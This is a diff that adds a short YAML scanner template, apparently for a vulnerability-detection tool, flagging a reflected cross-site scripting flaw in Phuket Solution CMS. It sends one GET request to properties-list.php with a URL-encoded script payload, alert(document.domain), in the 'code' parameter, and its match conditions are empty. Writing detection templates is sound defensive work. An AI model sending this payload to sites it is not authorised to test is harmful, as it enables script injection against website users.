@@ -1,0 +1,17 @@
+id: phuket-cms-xss
+brief:
+    title: Phuket Solution CMS - Cross Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: Phuket Solutions CMS is vulnerable to Reflected XSS in which an attacker injects malicious executable scripts into the code of a trusted application or website.
+    label:
+        - xss
+        - phuket
+        - phuket-cms
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/properties-list.php?property-types=1&types=2&location=&prices=&bedroom=&code=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs: []
